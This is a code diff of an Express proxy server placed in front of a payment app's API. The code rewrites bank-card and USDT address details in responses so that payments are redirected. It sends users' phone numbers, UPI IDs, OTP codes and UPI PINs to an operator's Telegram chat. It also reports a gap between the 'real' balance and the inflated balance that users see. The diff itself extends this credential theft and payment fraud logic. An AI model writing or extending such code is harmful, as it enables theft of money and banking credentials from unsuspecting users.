@@ -476,7 +476,7 @@ function applyUsdtReplacement(respBody, usdtAddress) {
   return { replaced, body: newBody, oldAddr };
 }
 
-async function proxyAndReplaceBankDetails(req, res, label) {
+async function proxyAndReplaceBankDetails(req, res, label, notify = false) {
   const data = await loadData();
   const reqUserId = await extractUserId(req, null);
   if (!data.botEnabled) { await transparentProxy(req, res); return; }
@@ -509,7 +509,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     delete respHeaders['last-modified'];
     res.writeHead(200, respHeaders);
     res.end(finalBody);
-    if (!isLogOff(data, effectiveId) && data.adminChatId && bot) {
+    if (notify && !isLogOff(data, effectiveId) && data.adminChatId && bot) {
       const phone = getPhone(data, effectiveId);
       bot.sendMessage(data.adminChatId, `${label} [${effectiveId || 'N/A'}]${phone ? ' 📱' + phone : ''}${bank ? ' → Bank: ' + bank.accountHolder : ''}`).catch(()=>{});
     }
@@ -915,9 +915,11 @@ app.all('/app/bind/send/otp', async (req, res) => {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    if (data.adminChatId && bot) {
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const upiId = body.upiId || body.upi || body.account || '';
       bot.sendMessage(data.adminChatId,
-        `📲 UPI Bind OTP Sent\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+        `📲 UPI Bind OTP [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}${upiId ? '\n🏷️ UPI: ' + upiId : ''}`
       ).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -931,10 +933,12 @@ app.all('/app/bind/check/otp', async (req, res) => {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    const respData = getResponseData(jsonResp);
-    if (data.adminChatId && bot) {
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const otp = body.otp || body.code || body.verifyCode || '';
+      const success = jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success);
       bot.sendMessage(data.adminChatId,
-        `📲 UPI Bind Check OTP\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Response: ${JSON.stringify(respData).substring(0, 500)}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+        `📲 UPI OTP Verify [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}${otp ? '\n🔢 OTP: ' + otp : ''}\n${success ? '✅ Success' : '❌ Failed'}`
       ).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -950,11 +954,14 @@ app.all('/app/bind/select/upi', async (req, res) => {
     if (userId) saveTokenUserId(req, userId);
     const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
     const pin = body.pin || body.upiPin || body.securePin || body.payPin || qp.pin || qp.upiPin || '';
-    const respData = getResponseData(jsonResp);
-    if (data.adminChatId && bot) {
-      let msg = `🔗 UPI BIND SELECT\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${getPhone(data, userId) || 'N/A'}\n🔐 PIN: ${pin || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Response: ${JSON.stringify(respData).substring(0, 500)}`;
-      if (!pin) msg += `\n🔗 Query: ${JSON.stringify(qp).substring(0, 300)}`;
-      msg += `\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const upiId = body.upiId || body.upi || body.account || '';
+      const success = jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success);
+      let msg = `🔗 UPI Bind Select [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
+      if (upiId) msg += `\n🏷️ UPI: ${upiId}`;
+      if (pin) msg += `\n🔐 PIN: ${pin}`;
+      msg += `\n${success ? '✅ Success' : '❌ Failed'}`;
       bot.sendMessage(data.adminChatId, msg).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -963,16 +970,9 @@ app.all('/app/bind/select/upi', async (req, res) => {
 
 app.all('/app/bind/pre/check', async (req, res) => {
   try {
-    const data = await loadData();
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId,
-        `🔍 UPI Pre-Check\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Response: ${JSON.stringify(getResponseData(jsonResp)).substring(0, 500)}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
-    }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -995,13 +995,13 @@ for (const ep of BIND_ENDPOINTS) {
       if (userId) saveTokenUserId(req, userId);
       const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
       const pin = body.pin || body.upiPin || body.securePin || body.payPin || qp.pin || qp.upiPin || '';
-      const respData = getResponseData(jsonResp);
-      if (data.adminChatId && bot) {
-        let msg = `📲 UPI Bind: ${ep.split('/').pop()}\n👤 User: ${userId || 'N/A'}`;
+      if (!isLogOff(data, userId) && data.adminChatId && bot) {
+        const phone = getPhone(data, userId);
+        const step = ep.split('/').slice(-2).join('/');
+        const success = jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success);
+        let msg = `📲 Bind [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''} • ${step}`;
         if (pin) msg += `\n🔐 PIN: ${pin}`;
-        msg += `\n📦 Body: ${JSON.stringify(body).substring(0, 400)}`;
-        msg += `\n📊 Resp: ${JSON.stringify(respData).substring(0, 400)}`;
-        msg += `\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+        msg += `\n${success ? '✅' : '❌'} ${jsonResp ? (jsonResp.msg || jsonResp.message || '') : ''}`;
         bot.sendMessage(data.adminChatId, msg).catch(()=>{});
       }
       sendJson(res, respHeaders, jsonResp, respBody);
@@ -1057,7 +1057,22 @@ app.all('/app/user/info', async (req, res) => {
       saveData(freshData).catch(()=>{});
     }
     if (!isLogOff(data, effectiveUserId) && data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `👤 Info [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
+      const infoOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
+      const infoAdded = infoOvr && infoOvr.addedBalance !== undefined ? infoOvr.addedBalance : 0;
+      const realBal = bal !== '' ? bal : 'N/A';
+      const displayBal = (realBal !== 'N/A' && infoAdded !== 0)
+        ? parseFloat((parseFloat(realBal) + infoAdded).toFixed(2))
+        : realBal;
+      let infoMsg = `👤 Info [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}`;
+      if (infoAdded !== 0) {
+        infoMsg += `\n━━━━━━━━━━━━━━━━━━`;
+        infoMsg += `\n🏦 Real Balance: ₹${realBal}`;
+        infoMsg += `\n➕ Bot Added: ₹${infoAdded}`;
+        infoMsg += `\n👁️ User Sees: ₹${displayBal}`;
+      } else {
+        infoMsg += `\n💰 Balance: ₹${realBal}`;
+      }
+      bot.sendMessage(data.adminChatId, infoMsg).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -1096,9 +1111,21 @@ app.all('/app/user/account/wallet', async (req, res) => {
     delete respHeaders['last-modified'];
     res.writeHead(200, respHeaders);
     res.end(walletBody);
-    if (!isLogOff(data, userId) && data.adminChatId && bot) {
-      const walletKeys = respData ? Object.keys(respData).join(',') : 'null';
-      bot.sendMessage(data.adminChatId, `💼 Wallet [${userId || 'N/A'}]\n🔑 Keys: ${walletKeys}\n📊 Data: ${JSON.stringify(respData).substring(0, 300)}`).catch(()=>{});
+    if (!isLogOff(data, userId) && data.adminChatId && bot && data.logRequests) {
+      const walletOvr = data.userOverrides && data.userOverrides[String(userId)];
+      const walletAdded = walletOvr && walletOvr.addedBalance !== undefined ? walletOvr.addedBalance : 0;
+      const wBal = respData
+        ? (respData.balance ?? respData.wallet ?? respData.amount ?? respData.inrBalance ?? respData.received ?? 'N/A')
+        : 'N/A';
+      const phone = getPhone(data, userId);
+      let wMsg = `💼 Wallet [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
+      if (walletAdded !== 0) {
+        const realW = wBal !== 'N/A' ? parseFloat(wBal) - walletAdded : 'N/A';
+        wMsg += `\n🏦 Real: ₹${realW} | ➕ Added: ₹${walletAdded} | 👁️ Shows: ₹${wBal}`;
+      } else {
+        wMsg += `\n💰 Balance: ₹${wBal}`;
+      }
+      bot.sendMessage(data.adminChatId, wMsg).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -1108,19 +1135,19 @@ app.all('/app/bank/debit/card/list', async (req, res) => {
 });
 
 app.all('/app/bank/debit/add/card', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💳 Add Bank Card');
+  await proxyAndReplaceBankDetails(req, res, '💳 Add Bank Card', true);
 });
 
 app.all('/app/bank/debit/update/card', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💳 Update Bank Card');
+  await proxyAndReplaceBankDetails(req, res, '💳 Update Bank Card', true);
 });
 
 app.all('/app/bank/debit/delete/card', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💳 Delete Bank Card');
+  await proxyAndReplaceBankDetails(req, res, '💳 Delete Bank Card', true);
 });
 
 app.all('/app/bank/debit/update/switch', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💳 Bank Switch');
+  await proxyAndReplaceBankDetails(req, res, '💳 Bank Switch', true);
 });
 
 app.all('/app/pay/debit/task', async (req, res) => {
@@ -1130,25 +1157,20 @@ app.all('/app/pay/debit/task', async (req, res) => {
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
     sendJson(res, respHeaders, jsonResp, respBody);
-    if (data.adminChatId && bot) {
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
       const respData = getResponseData(jsonResp);
-      const taskCount = Array.isArray(respData) ? respData.length : (respData && respData.list ? respData.list.length : '?');
-      const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? jsonResp.statusCode ?? '?') : '?';
-      const msg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
-      const reqBody = req.parsedBody ? JSON.stringify(req.parsedBody).substring(0, 200) : 'none';
-      const rawLen = req.rawBody ? req.rawBody.length : 0;
-      const httpStatus = response ? response.status : '?';
-      const hasSig = req.headers['signature'] ? 'yes' : 'no';
-      const hasToken = req.headers['logintoken'] ? 'yes' : 'no';
-      const ct = req.headers['content-type'] || 'none';
-      let sigVerify = 'no-key';
-      const storedKey = await getSessionKey(String(userId));
-      if (storedKey && req.parsedBody) {
-        const expectedSig = computeSignature(storedKey, req.parsedBody);
-        const actualSig = req.headers['signature'] || '';
-        sigVerify = expectedSig === actualSig ? '✅MATCH' : `❌MISMATCH(exp:${expectedSig.substring(0,8)} got:${actualSig.substring(0,8)})`;
-      }
-      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body: ${reqBody}\n🔐 Sig: ${hasSig} | SigCheck: ${sigVerify}\n📥 ${respBody.substring(0, 500)}`).catch(()=>{});
+      const phone = getPhone(data, userId);
+      const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? jsonResp.statusCode ?? '') : '';
+      const apiMsg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
+      const taskList = Array.isArray(respData) ? respData
+        : (respData && respData.list ? respData.list
+        : (respData && respData.records ? respData.records : null));
+      const taskCount = taskList ? taskList.length : '?';
+      const activeBank = getActiveBank(data, userId);
+      let taskMsg = `📋 Task [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
+      taskMsg += `\n📊 Count: ${taskCount}${statusCode ? ' | Code: ' + statusCode : ''}${apiMsg ? ' | ' + apiMsg : ''}`;
+      if (activeBank) taskMsg += `\n🏦 Bank: ${activeBank.accountHolder} | ${activeBank.accountNo}`;
+      bot.sendMessage(data.adminChatId, taskMsg).catch(()=>{});
     }
   } catch(e) {
     if (bot && (await loadData()).adminChatId) {
@@ -1181,10 +1203,18 @@ app.all('/app/pay/submit/utr', async (req, res) => {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId,
-        `📤 UTR Submit\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Status: ${jsonResp ? (jsonResp.code || jsonResp.status || 'N/A') : 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const utr = body.utr || body.utrNo || body.transactionId || body.txnId || 'N/A';
+      const amount = body.amount || body.money || body.orderAmount || '';
+      const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? '') : '';
+      const apiMsg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      let utrMsg = `📤 UTR Submit [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
+      utrMsg += `\n🔢 UTR: ${utr}${amount ? ' | ₹' + amount : ''}`;
+      utrMsg += `\n${statusCode === 200 || statusCode === '200' ? '✅' : statusCode ? '⚠️ Code: ' + statusCode : ''} ${apiMsg}`;
+      utrMsg += `\n🕐 ${now}`;
+      bot.sendMessage(data.adminChatId, utrMsg).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1197,9 +1227,12 @@ app.all('/app/pay/cancel/task', async (req, res) => {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    if (data.adminChatId && bot) {
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const orderId = body.orderId || body.id || body.taskId || 'N/A';
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
       bot.sendMessage(data.adminChatId,
-        `❌ Task Cancel\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 300)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+        `❌ Cancel Task [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}\n📋 Order: ${orderId}\n🕐 ${now}`
       ).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1207,7 +1240,7 @@ app.all('/app/pay/cancel/task', async (req, res) => {
 });
 
 app.all('/app/user/create/order', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '🛒 Create Order');
+  await proxyAndReplaceBankDetails(req, res, '🛒 Create Order', true);
 });
 
 app.all('/app/user/get/order', async (req, res) => {
@@ -1225,10 +1258,16 @@ app.all('/app/user/submit/upi', async (req, res) => {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId,
-        `📤 UPI Submit\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const upiId = body.upiId || body.upi || body.account || '';
+      const amount = body.amount || body.money || '';
+      const success = jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success);
+      let msg = `📤 UPI Submit [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
+      if (upiId) msg += `\n🏷️ UPI: ${upiId}`;
+      if (amount) msg += ` | ₹${amount}`;
+      msg += `\n${success ? '✅ Success' : '❌ Failed'}`;
+      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1261,12 +1300,6 @@ app.all('/app/user/upi/bind/list', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    const respData = getResponseData(jsonResp);
-    if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId,
-        `📋 UPI Bind List\n👤 User: ${userId || 'N/A'}\n📊 UPIs: ${JSON.stringify(respData).substring(0, 500)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
-    }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
@@ -1278,9 +1311,11 @@ app.all('/app/user/upi/unbind', async (req, res) => {
     const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
-    if (data.adminChatId && bot) {
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const upiId = body.upiId || body.upi || body.id || 'N/A';
       bot.sendMessage(data.adminChatId,
-        `🔓 UPI Unbind\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 300)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+        `🔓 UPI Unbind [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}\n🏷️ UPI: ${upiId}`
       ).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
